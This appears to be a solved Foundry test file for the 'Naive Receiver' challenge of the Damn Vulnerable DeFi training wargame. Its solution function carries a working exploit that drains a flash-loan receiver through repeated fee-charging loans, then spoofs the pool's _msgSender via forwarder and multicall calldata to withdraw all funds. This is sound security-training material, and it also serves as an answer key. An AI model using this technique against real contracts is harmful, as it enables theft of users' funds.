// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * 1. Anyone can call flashLoan specifying ANY receiver - the receiver pays the 1 ETH fee
         *    This allows draining the receiver's 10 WETH by forcing 10 flash loans on them
         * 
         * 2. The pool's _msgSender() extracts the sender from the last 20 bytes of msg.data
         *    when called through the trusted forwarder. Combined with multicall's delegatecall,
         *    we can craft calldata that ends with deployer's address to spoof them.
         *
         * 3. The pool is funded by deployer (deposits[deployer] = 1000 WETH initially)
         *    Flash loan fees also go to deployer, so after draining receiver:
         *    deposits[deployer] = 1000 + 10 = 1010 WETH
         *
         * EXPLOIT STRATEGY:
         * 1. Build multicall data array with:
         *    - 10x flashLoan calls targeting the receiver (drains their 10 WETH)
         *    - 1x withdraw call with deployer address appended (spoofs _msgSender)
         * 2. Sign and execute via forwarder in a single transaction
         */

        // Build the multicall payload
        bytes[] memory calls = new bytes[](11);
        
        // 10 flash loans to drain the receiver (1 ETH fee each)
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (IERC3156FlashBorrower(address(receiver)), address(weth), 0, bytes(""))
            );
        }
        
        // Withdraw call with deployer address appended to spoof _msgSender()
        // This makes _msgSender() return deployer when called via forwarder
        calls[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            deployer  // Append deployer address - _msgSender() will extract this
        );

        // Encode the multicall
        bytes memory multicallData = abi.encodeCall(Multicall.multicall, (calls));

        // Build the forwarder request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30_000_000,
            nonce: 0,
            data: multicallData,
            deadline: block.timestamp + 1 days
        });

        // Sign the request using EIP-712
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute via forwarder - single transaction!
        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
